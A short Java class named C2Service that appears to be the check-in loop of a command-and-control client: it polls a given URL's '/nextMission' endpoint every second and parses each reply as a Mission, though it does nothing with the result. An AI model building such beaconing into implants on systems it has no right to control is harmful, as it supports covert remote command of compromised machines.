package services;

import com.google.gson.Gson;
import entities.Mission;

import java.io.IOException;

import static utils.HttpUtil.sendGET;

public class C2Service {
    private final static Gson gson = new Gson();

    public void listen(String c2Url) {
        String response;
        while (true) {
            try {
                response = sendGET(c2Url + "/nextMission");
                gson.fromJson(response, Mission.class);
            } catch (IOException e) {
                // no mission
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
            }
        }
    }
}
